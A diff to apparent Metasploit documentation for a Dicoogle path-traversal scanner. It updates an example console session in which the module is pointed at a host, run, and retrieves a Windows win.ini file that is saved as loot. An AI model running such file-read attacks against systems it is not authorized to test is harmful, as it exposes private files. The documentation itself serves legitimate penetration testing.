@@ -22,9 +22,11 @@ successfully tested against Windows targets.
   msf5 > use auxiliary/scanner/http/dicoogle_traversal 
   msf5 auxiliary(scanner/http/dicoogle_traversal) > set rhosts 1.1.1.1
   rhosts => 1.1.1.1
+  msf5 auxiliary(scanner/http/dicoogle_traversal) > set verbose true
+  verbose => true
   msf5 auxiliary(scanner/http/dicoogle_traversal) > run
   
-  [+] ; for 16-bit app support
+  [+] 192.168.2.164:8080 - ; for 16-bit app support
   [fonts]
   [extensions]
   [mci extensions]
@@ -32,7 +34,5 @@ successfully tested against Windows targets.
   [Mail]
   MAPI=1
   
-  [+] File saved in: /root/.msf4/loot/20180721210736_default_1.1.1.1_dicoogle.travers_903795.txt
-  [*] Scanned 1 of 1 hosts (100% complete)
-  [*] Auxiliary module execution completed
+  [+] File saved in: /root/.msf4/loot/20180803091123_default_192.168.2.164_dicoogle.travers_347491.txt
   ```
